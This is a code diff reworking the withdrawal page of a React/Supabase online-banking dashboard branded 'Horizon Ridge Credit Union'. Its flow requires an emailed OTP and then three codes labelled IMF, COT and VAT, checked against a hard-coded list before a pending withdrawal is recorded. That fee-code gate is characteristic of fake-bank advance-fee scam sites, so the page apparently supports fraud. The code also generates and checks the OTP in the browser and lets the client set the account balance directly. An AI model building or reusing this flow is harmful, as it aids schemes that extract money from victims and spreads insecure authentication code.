@@ -76,9 +76,7 @@ const complexCodes = [
 const generateReceiptId = () => {
   const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
   let result = "HRCU-";
-  for (let i = 0; i < 12; i++) {
-    result += chars.charAt(Math.floor(Math.random() * chars.length));
-  }
+  for (let i = 0; i < 12; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
   return result;
 };
 
@@ -107,8 +105,7 @@ const generateReceiptHtml = (tx: any, profileName: string) => {
       <div style="margin-top:16px;padding-top:12px;border-top:1px solid #eee;text-align:center;font-size:10px;color:#aaa;">
         Horizon Ridge Credit Union - Generated Receipt
       </div>
-    </div>
-  `;
+    </div>`;
 };
 
 export default function WithdrawalPage() {
@@ -119,88 +116,192 @@ export default function WithdrawalPage() {
   const [error, setError] = useState<string | null>(null);
   const [showOtpModal, setShowOtpModal] = useState(false);
   const [otpData, setOtpData] = useState<{
-    amount: number;
-    desc: string;
-    bank: string;
-    accNum: string;
-    accName: string;
-    type: string;
-    otp: string;
-    balance_before: number;
-    balance_after: number;
+    amount: number; desc: string; bank: string; accNum: string; accName: string; type: string;
+    otp: string; balance_before: number; balance_after: number;
   } | null>(null);
   const [submitting, setSubmitting] = useState(false);
 
-  // Code verification states
   const [showReceipt, setShowReceipt] = useState(false);
   const [receiptData, setReceiptData] = useState<{
-    amount: number;
-    description: string;
-    bank: string;
-    accName: string;
-    accNum: string;
-    type: string;
-    balanceBefore: number;
-    balanceAfter: number;
-    receiptId: string;
-    date: string;
-    otpRef: string;
+    amount: number; description: string; bank: string; accName: string; accNum: string;
+    type: string; balanceBefore: number; balanceAfter: number; receiptId: string; date: string; otpRef: string;
   } | null>(null);
   const [codeStep, setCodeStep] = useState<"imf" | "cot" | "vat" | null>(null);
   const [code, setCode] = useState("");
   const [codeError, setCodeError] = useState<string | null>(null);
   const [codeLoading, setCodeLoading] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
-  const [successData, setSuccessData] = useState<{
-    amount: number;
-    description: string;
-    receiptId: string;
-    date: string;
-  } | null>(null);
+  const [successData, setSuccessData] = useState<{ amount: number; description: string; receiptId: string; date: string } | null>(null);
 
   const otpInputRef = useRef<HTMLInputElement>(null);
   const codeInputRef = useRef<HTMLInputElement>(null);
 
   useEffect(() => {
-    if (showOtpModal && otpInputRef.current) {
-      setTimeout(() => otpInputRef.current?.focus(), 100);
-    }
+    if (showOtpModal && otpInputRef.current) setTimeout(() => otpInputRef.current?.focus(), 100);
   }, [showOtpModal]);
 
   useEffect(() => {
-    if (codeStep && codeInputRef.current) {
-      setTimeout(() => codeInputRef.current?.focus(), 100);
-    }
+    if (codeStep && codeInputRef.current) setTimeout(() => codeInputRef.current?.focus(), 100);
   }, [codeStep]);
 
   useEffect(() => {
     const supabase = createClient();
-
     supabase.auth.getUser().then(async ({ data: { user } }) => {
-      if (!user) {
-        router.push("/login");
-        return;
-      }
-
+      if (!user) { router.push("/login"); return; }
       try {
         const [profileRes, accountRes] = await Promise.all([
           supabase.from("profiles").select("*").eq("id", user.id).single(),
           supabase.from("accounts").select("*").eq("user_id", user.id).single(),
         ]);
-
         if (profileRes.error) throw profileRes.error;
         if (accountRes.error) throw accountRes.error;
-
         setProfile(profileRes.data);
         setAccount(accountRes.data);
       } catch (err: any) {
         setError(err.message);
         showToast("Failed to load profile", "error");
-      } finally {
-        setLoading(false);
-      }
+      } finally { setLoading(false); }
     });
   }, [router]);
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setSubmitting(true);
+    try {
+      const form = e.currentTarget as HTMLFormElement;
+      const amount = parseFloat((form as any).amount.value);
+      const desc = (form as any).desc.value.trim();
+      const bank = (form as any).bank.value.trim();
+      const accNum = (form as any).account_number.value.trim();
+      const accName = (form as any).account_name.value.trim();
+      const type = (form as any).type.value;
+
+      if (amount < 200) { showToast("Minimum withdrawal is $200", "error"); return; }
+      if (!bank || !accNum || !accName) { showToast("All bank details required.", "error"); return; }
+
+      const balance_before = account?.balance || 0;
+      const balance_after = balance_before - amount;
+      const otp = Math.floor(100000 + Math.random() * 900000).toString();
+
+      setOtpData({ amount, desc, bank, accNum, accName, type, otp, balance_before, balance_after });
+
+      try {
+        await fetch("/api/send-email", {
+          method: "POST", headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            to: profile!.email, subject: "Withdrawal OTP Code - Horizon Ridge",
+            html: `<div style="font-family:sans-serif;max-width:480px;margin:auto;background:#f9f9f9;padding:24px;border-radius:8px;">
+              <h2 style="color:#1e3a8a;">Withdrawal OTP</h2>
+              <p>Dear <b>${profile!.full_name}</b>,</p>
+              <p>Use the OTP below to verify your withdrawal:</p>
+              <div style="text-align:center;margin:24px 0;">
+                <span style="font-size:28px;font-weight:bold;color:#1e3a8a;letter-spacing:6px;background:#f0f0f0;padding:12px 24px;border-radius:8px;">${otp}</span>
+              </div>
+              <p style="color:#888;font-size:12px;">This OTP expires in 10 minutes.</p>
+              <hr style="margin:16px 0;">
+              <div style="font-size:11px;color:#aaa;">Horizon Ridge Credit Union</div>
+            </div>`,
+          }),
+        });
+      } catch { console.warn("OTP email send failed"); }
+
+      showToast("OTP sent to your email", "info");
+      setShowOtpModal(true);
+    } finally { setSubmitting(false); }
+  };
+
+  const handleOtpSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!otpData) return;
+    const form = e.currentTarget as HTMLFormElement;
+    const userOtp = (form as any).otp.value.trim();
+    if (userOtp !== otpData.otp) { showToast("Invalid OTP", "error"); return; }
+
+    setShowOtpModal(false);
+    const receiptId = generateReceiptId();
+    const date = new Date().toLocaleDateString("en-US", {
+      year: "numeric", month: "short", day: "numeric", hour: "2-digit", minute: "2-digit",
+    });
+
+    setReceiptData({
+      amount: otpData.amount, description: otpData.desc, bank: otpData.bank,
+      accName: otpData.accName, accNum: otpData.accNum, type: otpData.type,
+      balanceBefore: otpData.balance_before, balanceAfter: otpData.balance_after,
+      receiptId, date, otpRef: userOtp,
+    });
+    setShowReceipt(true);
+  };
+
+  const verifyCode = async (step: "imf" | "cot" | "vat", inputCode: string): Promise<boolean> => {
+    const upperCode = inputCode.toUpperCase().trim();
+    if (!upperCode) { setCodeError("No code provided"); return false; }
+    const codeIndex = complexCodes.indexOf(upperCode);
+    if (codeIndex === -1) { setCodeError(`Invalid ${step.toUpperCase()} code entered`); return false; }
+    complexCodes.splice(codeIndex, 1);
+    await new Promise((r) => setTimeout(r, 800 + Math.random() * 700));
+    return true;
+  };
+
+  const processTransaction = async () => {
+    if (!otpData || !receiptData) return;
+    setShowReceipt(false);
+    setCodeStep(null);
+
+    try {
+      const supabase = createClient();
+      const { error: txError } = await supabase.from("transactions").insert({
+        user_id: profile!.id, account_id: account!.id, type: "withdrawal",
+        description: otpData.desc, amount: otpData.amount, status: "pending",
+        balance_after: otpData.balance_after,
+      });
+      if (txError) throw txError;
+
+      const { error: updateError } = await supabase.from("accounts").update({ balance: otpData.balance_after }).eq("id", account!.id);
+      if (updateError) throw updateError;
+
+      await supabase.from("notifications").insert([{
+        user_id: profile!.id, title: "Withdrawal Request Submitted",
+        message: `Your withdrawal request of ${fmt(otpData.amount)} has been submitted and is pending approval.`,
+        type: "info", read: false,
+      }]);
+
+      setAccount(prev => ({ ...prev!, balance: otpData.balance_after }));
+      setSuccessData({ amount: otpData.amount, description: otpData.desc, receiptId: receiptData.receiptId, date: receiptData.date });
+      setShowSuccess(true);
+    } catch (err: any) {
+      showToast("Failed to process withdrawal: " + err.message, "error");
+    }
+  };
+
+  const handleCodeSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!codeStep || !code.trim()) { setCodeError("Please enter a code"); return; }
+    setCodeLoading(true);
+    setCodeError(null);
+    try {
+      const isValid = await verifyCode(codeStep, code);
+      if (!isValid) { setCodeLoading(false); return; }
+      setCode(""); setCodeLoading(false);
+      if (codeStep === "imf") { setCodeStep("cot"); showToast("IMF code verified. Enter COT code.", "success"); }
+      else if (codeStep === "cot") { setCodeStep("vat"); showToast("COT code verified. Enter VAT code.", "success"); }
+      else if (codeStep === "vat") { setCodeStep(null); showToast("All codes verified. Processing withdrawal.", "success"); await processTransaction(); }
+    } catch (err: any) { setCodeError(err.message || "Verification failed"); setCodeLoading(false); }
+  };
+
+  const handleReceiptContinue = () => {
+    setShowReceipt(false);
+    setCodeStep("imf");
+    showToast("Enter IMF code to proceed", "info");
+  };
+
+  const handleSuccessClose = () => {
+    setShowSuccess(false);
+    setOtpData(null); setReceiptData(null); setSuccessData(null);
+  };
+
+  const codeStepLabel = codeStep === "imf" ? "IMF" : codeStep === "cot" ? "COT" : "VAT";
+  const codeStepTitle = codeStep === "imf" ? "International Monetary Fund"
+    : codeStep === "cot" ? "Currency Off-shore Transfer" : "Value Added Tax";
 
   if (loading) {
     return (
@@ -218,11 +319,9 @@ export default function WithdrawalPage() {
   if (error) {
     return (
       <DashboardShell>
-        <div className="p-6 text-center text-red-500 dark:text-red-400">
+        <div className="p-4 text-center text-red-500 dark:text-red-400">
           <p>{error}</p>
-          <Link href="/" className="mt-4 inline-block text-brand-sun hover:text-brand-navy dark:hover:text-brand-sun/80">
-            Go Home
-          </Link>
+          <Link href="/" className="mt-4 inline-block text-brand-sun hover:text-brand-navy text-sm">Go Home</Link>
         </div>
       </DashboardShell>
     );
@@ -231,409 +330,95 @@ export default function WithdrawalPage() {
   if (!profile || !account) {
     return (
       <DashboardShell>
-        <div className="p-6 text-center text-gray-500 dark:text-gray-400">
-          <p>Loading profile...</p>
-        </div>
+        <div className="p-4 text-center text-gray-500 dark:text-gray-400"><p>Loading profile...</p></div>
       </DashboardShell>
     );
   }
 
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-    setSubmitting(true);
-    try {
-      const form = e.currentTarget as HTMLFormElement;
-      const amount = parseFloat(form.amount.value);
-      const desc = form.desc.value.trim();
-      const bank = form.bank.value.trim();
-      const accNum = form.account_number.value.trim();
-      const accName = form.account_name.value.trim();
-      const type = form.type.value;
-
-      if (amount < 200) {
-        showToast("Minimum withdrawal is $200", "error");
-        return;
-      }
-      if (!bank || !accNum || !accName) {
-        showToast("All bank details required.", "error");
-        return;
-      }
-
-      const balance_before = account.balance || 0;
-      const balance_after = balance_before - amount;
-
-      // Generate OTP
-      const otp = Math.floor(100000 + Math.random() * 900000).toString();
-
-      // Store OTP data in state for modal
-      setOtpData({
-        amount,
-        desc,
-        bank,
-        accNum,
-        accName,
-        type,
-        otp,
-        balance_before,
-        balance_after,
-      });
-
-      // Send OTP via email
-      try {
-        await fetch("/api/send-email", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            to: profile!.email,
-            subject: "Withdrawal OTP Code - Horizon Ridge",
-            html: `
-              <div style="font-family:sans-serif;max-width:480px;margin:auto;background:#f9f9f9;padding:24px;border-radius:8px;">
-                <h2 style="color:#1e3a8a;">Withdrawal OTP</h2>
-                <p>Dear <b>${profile!.full_name}</b>,</p>
-                <p>Use the OTP below to verify your withdrawal request:</p>
-                <div style="text-align:center;margin:24px 0;">
-                  <span style="font-size:28px;font-weight:bold;color:#1e3a8a;letter-spacing:6px;background:#f0f0f0;padding:12px 24px;border-radius:8px;">${otp}</span>
-                </div>
-                <p style="color:#888;font-size:12px;">This OTP expires in 10 minutes. Do not share this code.</p>
-                <hr style="margin:16px 0;">
-                <div style="font-size:11px;color:#aaa;">Horizon Ridge Credit Union</div>
-              </div>
-            `,
-          }),
-        });
-      } catch {
-        console.warn("OTP email send failed, but OTP flow continues");
-      }
-
-      showToast("OTP sent to your email", "info");
-      setShowOtpModal(true);
-    } finally {
-      setSubmitting(false);
-    }
-  };
-
-  const handleOtpSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-    if (!otpData) return;
-    const form = e.currentTarget as HTMLFormElement;
-    const userOtp = form.otp.value.trim();
-
-    if (userOtp !== otpData.otp) {
-      showToast("Invalid OTP", "error");
-      return;
-    }
-
-    // OTP correct, show receipt preview (code flow comes after)
-    setShowOtpModal(false);
-
-    const receiptId = generateReceiptId();
-    const date = new Date().toLocaleDateString("en-US", {
-      year: "numeric",
-      month: "short",
-      day: "numeric",
-      hour: "2-digit",
-      minute: "2-digit",
-    });
-
-    setReceiptData({
-      amount: otpData.amount,
-      description: otpData.desc,
-      bank: otpData.bank,
-      accName: otpData.accName,
-      accNum: otpData.accNum,
-      type: otpData.type,
-      balanceBefore: otpData.balance_before,
-      balanceAfter: otpData.balance_after,
-      receiptId,
-      date,
-      otpRef: userOtp,
-    });
-    setShowReceipt(true);
-  };
-
-  const verifyCode = async (step: "imf" | "cot" | "vat", inputCode: string): Promise<boolean> => {
-    const upperCode = inputCode.toUpperCase().trim();
-    if (!upperCode) {
-      setCodeError("No code provided");
-      return false;
-    }
-    const codeIndex = complexCodes.indexOf(upperCode);
-    if (codeIndex === -1) {
-      setCodeError(`Invalid ${step.toUpperCase()} code entered`);
-      return false;
-    }
-    complexCodes.splice(codeIndex, 1);
-    await new Promise((r) => setTimeout(r, 800 + Math.random() * 700));
-    return true;
-  };
-
-  const processTransaction = async () => {
-    if (!otpData || !receiptData) return;
-
-    setShowReceipt(false);
-    setCodeStep(null);
-
-    try {
-      const supabase = createClient();
-
-      const { error: txError } = await supabase.from("transactions").insert({
-        user_id: profile.id,
-        account_id: account.id,
-        type: "withdrawal",
-        description: otpData.desc,
-        amount: otpData.amount,
-        status: "pending",
-        balance_after: otpData.balance_after,
-      });
-
-      if (txError) throw txError;
-
-      const { error: updateError } = await supabase
-        .from("accounts")
-        .update({ balance: otpData.balance_after })
-        .eq("id", account.id);
-
-      if (updateError) throw updateError;
-
-      await supabase.from("notifications").insert([
-        {
-          user_id: profile.id,
-          title: "Withdrawal Request Submitted",
-          message: `Your withdrawal request of ${fmt(otpData.amount)} has been submitted and is pending approval.`,
-          type: "info",
-          read: false,
-        }
-      ]);
-
-      setAccount(prev => ({ ...prev!, balance: otpData.balance_after }));
-
-      setSuccessData({
-        amount: otpData.amount,
-        description: otpData.desc,
-        receiptId: receiptData.receiptId,
-        date: receiptData.date,
-      });
-      setShowSuccess(true);
-    } catch (err: any) {
-      showToast("Failed to process withdrawal: " + err.message, "error");
-    }
-  };
-
-  const handleCodeSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-    if (!codeStep || !code.trim()) {
-      setCodeError("Please enter a code");
-      return;
-    }
-
-    setCodeLoading(true);
-    setCodeError(null);
-
-    try {
-      const isValid = await verifyCode(codeStep, code);
-      if (!isValid) {
-        setCodeLoading(false);
-        return;
-      }
-
-      setCode("");
-      setCodeLoading(false);
-
-      if (codeStep === "imf") {
-        setCodeStep("cot");
-        showToast("IMF code verified. Enter COT code.", "success");
-      } else if (codeStep === "cot") {
-        setCodeStep("vat");
-        showToast("COT code verified. Enter VAT code.", "success");
-      } else if (codeStep === "vat") {
-        setCodeStep(null);
-        showToast("All codes verified. Processing withdrawal.", "success");
-        await processTransaction();
-      }
-    } catch (err: any) {
-      setCodeError(err.message || "Verification failed");
-      setCodeLoading(false);
-    }
-  };
-
-  const handleReceiptContinue = () => {
-    setShowReceipt(false);
-    setCodeStep("imf");
-    showToast("Enter IMF code to proceed", "info");
-  };
-
-  const handleSuccessClose = () => {
-    setShowSuccess(false);
-    setOtpData(null);
-    setReceiptData(null);
-    setSuccessData(null);
-  };
-
-  const codeStepLabel = codeStep === "imf" ? "IMF" : codeStep === "cot" ? "COT" : "VAT";
-  const codeStepTitle =
-    codeStep === "imf"
-      ? "International Monetary Fund"
-      : codeStep === "cot"
-      ? "Currency Off-shore Transfer"
-      : "Value Added Tax";
-
   return (
     <DashboardShell>
-      <div className="max-w-5xl mx-auto py-6 px-4">
-        {/* Breadcrumb */}
-        <nav className="flex items-center gap-1 text-xs text-gray-500 dark:text-gray-400 mb-4">
-          <i className="fa-solid fa-house" />
-          <span>/</span>
-          <span className="text-gray-700 dark:text-gray-200">Withdrawal</span>
-        </nav>
+      <div className="px-4 py-4 md:p-6 max-w-3xl mx-auto">
+        {/* Page Header */}
+        <div className="mb-4">
+          <h1 className="text-lg font-semibold text-gray-900 dark:text-white">Withdraw Funds</h1>
+          <p className="text-xs text-gray-500 dark:text-gray-400 mt-0.5">Send money to your external bank account</p>
+        </div>
 
-        {/* Account status cards */}
-        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
-          <div className="p-4 rounded-xl bg-white dark:bg-gray-800 border border-gray-100 dark:border-gray-700 shadow-sm">
-            <div className="flex items-center justify-between">
-              <div>
-                <p className="text-xs text-gray-500 dark:text-gray-400 mb-0.5">Account Balance</p>
-                <h3 className="text-lg font-semibold text-gray-900 dark:text-white">
-                  {fmt(account.balance)}
-                </h3>
+        {/* Compact Account Info */}
+        <div className="bg-white dark:bg-gray-800 rounded-xl border border-gray-100 dark:border-gray-700 shadow-sm p-4 mb-4">
+          <div className="flex items-center justify-between">
+            <div className="flex items-center gap-3">
+              <div className="w-9 h-9 rounded-full bg-brand-sun/10 dark:bg-brand-sun/20 flex items-center justify-center">
+                <i className="fa-solid fa-wallet text-brand-sun text-sm" />
               </div>
-              <div className="p-2.5 rounded-full bg-brand-sun/10">
-                <i className="fa-solid fa-wallet text-brand-sun text-lg" />
+              <div>
+                <p className="text-[11px] text-gray-500 dark:text-gray-400">Available Balance</p>
+                <p className="text-base font-bold text-gray-900 dark:text-white">{fmt(account.balance)}</p>
               </div>
             </div>
-          </div>
-
-          <div className="p-4 rounded-xl bg-white dark:bg-gray-800 border border-gray-100 dark:border-gray-700 shadow-sm">
-            <div className="flex items-center justify-between">
-              <div>
-                <p className="text-xs text-gray-500 dark:text-gray-400 mb-0.5">Account Status</p>
-                <h3 className={`text-lg font-semibold ${account.is_active ? "text-green-600 dark:text-green-400" : "text-red-600 dark:text-red-400"}`}>
-                  {account.is_active ? "Active" : "Inactive"}
-                </h3>
-              </div>
-              <div className="p-2.5 rounded-full">
-                {account.is_active ? (
-                  <div className="bg-green-50 dark:bg-green-900/30 p-2.5 rounded-full">
-                    <i className="fa-solid fa-circle-check text-green-500 text-lg" />
-                  </div>
-                ) : (
-                  <div className="bg-red-50 dark:bg-red-900/30 p-2.5 rounded-full">
-                    <i className="fa-solid fa-circle-xmark text-red-500 text-lg" />
-                  </div>
-                )}
-              </div>
-            </div>
-          </div>
-
-          <div className="p-4 rounded-xl bg-white dark:bg-gray-800 border border-gray-100 dark:border-gray-700 shadow-sm">
-            <div className="flex items-center justify-between">
-              <div>
-                <p className="text-xs text-gray-500 dark:text-gray-400 mb-0.5">Account Type</p>
-                <h3 className="text-lg font-semibold text-orange-600 dark:text-orange-400">
-                  {account.account_type}
-                </h3>
-              </div>
-              <div className="p-2.5 rounded-full bg-orange-50 dark:bg-orange-900/30">
-                <i className="fa-solid fa-star text-orange-500 text-lg" />
-              </div>
+            <div className="text-right">
+              <p className="text-[10px] text-gray-400 dark:text-gray-500">{account.account_type}</p>
+              <p className={`text-[10px] font-medium ${account.is_active ? "text-green-600 dark:text-green-400" : "text-red-600 dark:text-red-400"}`}>
+                {account.is_active ? "Active" : "Inactive"}
+              </p>
             </div>
           </div>
         </div>
 
         {/* Withdrawal Form */}
-        <div className="p-6 rounded-xl bg-white dark:bg-gray-800 border border-gray-100 dark:border-gray-700 shadow-sm">
-          <h2 className="text-xl font-semibold text-gray-900 dark:text-white mb-4">
-            Withdraw Funds
-          </h2>
-          <form onSubmit={handleSubmit} className="space-y-4">
+        <div className="bg-white dark:bg-gray-800 rounded-xl border border-gray-100 dark:border-gray-700 shadow-sm p-4">
+          <form onSubmit={handleSubmit} className="space-y-3">
             <div>
-              <label className="block text-sm font-medium text-gray-700 dark:text-gray-200 mb-1">
-                Amount (USD)
-              </label>
-              <input
-                type="number"
-                name="amount"
-                required
-                min="200"
-                step="0.01"
-                className="block w-full rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-brand-dark px-4 py-2.5 text-sm text-brand-navy dark:text-brand-light placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-brand-sun focus:border-transparent transition"
+              <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-1">Amount (USD)</label>
+              <input type="number" name="amount" required min="200" step="0.01"
+                className="block w-full rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-brand-dark px-4 py-3 text-sm text-brand-navy dark:text-brand-light placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-brand-sun focus:border-transparent transition"
               />
             </div>
-
             <div>
-              <label className="block text-sm font-medium text-gray-700 dark:text-gray-200 mb-1">
-                Description
-              </label>
-              <input
-                type="text"
-                name="desc"
-                required
-                className="block w-full rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-brand-dark px-4 py-2.5 text-sm text-brand-navy dark:text-brand-light placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-brand-sun focus:border-transparent transition"
+              <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-1">Description</label>
+              <input type="text" name="desc" required
+                className="block w-full rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-brand-dark px-4 py-3 text-sm text-brand-navy dark:text-brand-light placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-brand-sun focus:border-transparent transition"
+                placeholder="Reason for withdrawal"
               />
             </div>
-
-            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+            <div>
+              <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-1">Bank Name</label>
+              <input type="text" name="bank" required
+                className="block w-full rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-brand-dark px-4 py-3 text-sm text-brand-navy dark:text-brand-light placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-brand-sun focus:border-transparent transition"
+              />
+            </div>
+            <div className="grid grid-cols-2 gap-3">
               <div>
-                <label className="block text-sm font-medium text-gray-700 dark:text-gray-200 mb-1">
-                  Bank Name
-                </label>
-                <input
-                  type="text"
-                  name="bank"
-                  required
-                  className="block w-full rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-brand-dark px-4 py-2.5 text-sm text-brand-navy dark:text-brand-light placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-brand-sun focus:border-transparent transition"
+                <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-1">Account Number</label>
+                <input type="text" name="account_number" required
+                  className="block w-full rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-brand-dark px-4 py-3 text-sm text-brand-navy dark:text-brand-light placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-brand-sun focus:border-transparent transition"
                 />
               </div>
               <div>
-                <label className="block text-sm font-medium text-gray-700 dark:text-gray-200 mb-1">
-                  Account Number
-                </label>
-                <input
-                  type="text"
-                  name="account_number"
-                  required
-                  className="block w-full rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-brand-dark px-4 py-2.5 text-sm text-brand-navy dark:text-brand-light placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-brand-sun focus:border-transparent transition"
-                />
-              </div>
-              <div>
-                <label className="block text-sm font-medium text-gray-700 dark:text-gray-200 mb-1">
-                  Account Name
-                </label>
-                <input
-                  type="text"
-                  name="account_name"
-                  required
-                  className="block w-full rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-brand-dark px-4 py-2.5 text-sm text-brand-navy dark:text-brand-light placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-brand-sun focus:border-transparent transition"
+                <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-1">Account Name</label>
+                <input type="text" name="account_name" required
+                  className="block w-full rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-brand-dark px-4 py-3 text-sm text-brand-navy dark:text-brand-light placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-brand-sun focus:border-transparent transition"
                 />
               </div>
             </div>
-
             <div>
-              <label className="block text-sm font-medium text-gray-700 dark:text-gray-200 mb-1">
-                Account Type
-              </label>
-              <select
-                name="type"
-                required
-                className="block w-full rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-brand-dark px-4 py-2.5 text-sm text-brand-navy dark:text-brand-light placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-brand-sun focus:border-transparent transition"
+              <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-1">Account Type</label>
+              <select name="type" required
+                className="block w-full rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-brand-dark px-4 py-3 text-sm text-brand-navy dark:text-brand-light focus:outline-none focus:ring-2 focus:ring-brand-sun focus:border-transparent transition"
               >
                 <option value="local">Local Account</option>
                 <option value="foreign">Foreign Account</option>
               </select>
             </div>
 
-            <div className="flex gap-3">
-              <button
-                type="submit"
-                disabled={submitting}
-                className="flex-1 px-4 py-2 rounded-lg bg-brand-sun text-white font-medium text-sm shadow-sm hover:bg-brand-navy transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
+            <div className="flex gap-3 pt-2">
+              <button type="submit" disabled={submitting}
+                className="flex-1 py-3 rounded-xl bg-brand-sun text-white font-semibold text-sm shadow-sm hover:bg-brand-navy transition-colors disabled:opacity-50 disabled:cursor-not-allowed active:scale-[0.98]"
               >
-                {submitting ? <i className="fa-solid fa-spinner fa-spin mr-1" /> : <i className="fa-solid fa-check mr-1" />}
-                {submitting ? "Processing..." : "Withdraw"}
+                {submitting ? <><i className="fa-solid fa-spinner fa-spin mr-1" /> Processing...</> : <><i className="fa-solid fa-check mr-1" /> Withdraw</>}
               </button>
-              <button
-                type="reset"
-                className="flex-1 px-4 py-2 rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-brand-dark text-sm text-brand-navy dark:text-brand-light hover:bg-gray-50 dark:hover:bg-gray-800 transition-colors"
+              <button type="reset"
+                className="px-5 py-3 rounded-xl border border-gray-300 dark:border-gray-700 bg-white dark:bg-brand-dark text-sm text-gray-700 dark:text-gray-300 hover:bg-gray-50 dark:hover:bg-gray-800 transition-colors"
               >
                 Reset
               </button>
@@ -641,285 +426,214 @@ export default function WithdrawalPage() {
           </form>
         </div>
 
-        {/* OTP Modal */}
+        {/* OTP Bottom Sheet */}
         {showOtpModal && otpData && (
-          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40">
-            <div className="bg-white dark:bg-gray-900 rounded-lg shadow-lg w-full max-w-md mx-4 p-6 relative">
-              <button
-                onClick={() => setShowOtpModal(false)}
-                className="absolute top-2 right-3 text-gray-400 hover:text-gray-700 dark:hover:text-white text-lg"
-              >
-                &times;
-              </button>
-              <h4 className="text-base font-medium mb-2 text-gray-900 dark:text-white">
-                Withdrawal OTP Verification
-              </h4>
-              <p className="text-sm text-gray-600 dark:text-gray-300 mb-4">
-                We've sent an OTP to your email. Please enter it below to verify your withdrawal request.
-              </p>
-              <form onSubmit={handleOtpSubmit} className="space-y-3">
-                <div>
-                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-200 mb-1">
-                    OTP Code
-                  </label>
-                  <input
-                    ref={otpInputRef}
-                    type="text"
-                    name="otp"
-                    required
-                    minLength={6}
-                    maxLength={6}
-                    className="block w-full rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-brand-dark px-4 py-2.5 text-sm text-center font-mono tracking-widest text-brand-navy dark:text-brand-light placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-brand-sun focus:border-transparent transition"
-                  />
-                </div>
-                <div className="flex justify-end">
-                  <button
-                    type="button"
-                    onClick={() => setShowOtpModal(false)}
-                    className="px-4 py-2 rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-brand-dark text-sm hover:border-brand-sun"
-                  >
-                    Cancel
-                  </button>
-                  <button
-                    type="submit"
-                    disabled={submitting}
-                    className="ml-3 px-4 py-2 rounded-lg bg-brand-sun text-white font-medium text-sm shadow-sm hover:bg-brand-navy disabled:opacity-50 disabled:cursor-not-allowed"
-                  >
-                    {submitting ? <i className="fa-solid fa-spinner fa-spin mr-1" /> : <i className="fa-solid fa-check mr-1" />}
-                    {submitting ? "Processing..." : "Verify OTP"}
+          <div className="fixed inset-0 z-50 flex items-end md:items-center justify-center">
+            <div className="absolute inset-0 bg-black/50" onClick={() => setShowOtpModal(false)} />
+            <div className="relative bg-white dark:bg-gray-900 rounded-t-2xl md:rounded-2xl w-full max-w-md mx-auto shadow-2xl animate-slide-up pb-6 md:pb-4">
+              <div className="flex justify-center pt-3 pb-1">
+                <div className="w-10 h-1 rounded-full bg-gray-300 dark:bg-gray-600" />
+              </div>
+              <div className="px-6 pt-2 pb-4">
+                <div className="flex items-center justify-between mb-4">
+                  <h4 className="text-base font-semibold text-gray-900 dark:text-white">OTP Verification</h4>
+                  <button onClick={() => setShowOtpModal(false)} className="p-1 text-gray-400 hover:text-gray-600">
+                    <i className="fa-solid fa-xmark text-lg" />
                   </button>
                 </div>
-              </form>
+                <p className="text-xs text-gray-500 dark:text-gray-400 mb-4">
+                  Enter the code sent to {profile.email}
+                </p>
+                <form onSubmit={handleOtpSubmit} className="space-y-4">
+                  <div>
+                    <input ref={otpInputRef} type="text" name="otp" required minLength={6} maxLength={6}
+                      className="block w-full rounded-xl border border-gray-300 dark:border-gray-700 bg-white dark:bg-brand-dark px-4 py-3 text-lg text-center tracking-[0.5em] font-mono text-brand-navy dark:text-brand-light placeholder-gray-300 focus:outline-none focus:ring-2 focus:ring-brand-sun focus:border-transparent transition"
+                      placeholder="000000"
+                    />
+                  </div>
+                  <div className="flex gap-3">
+                    <button type="button" onClick={() => setShowOtpModal(false)}
+                      className="flex-1 py-3 rounded-xl border border-gray-300 dark:border-gray-700 text-sm text-gray-700 dark:text-gray-300 hover:bg-gray-50 dark:hover:bg-gray-800"
+                    >
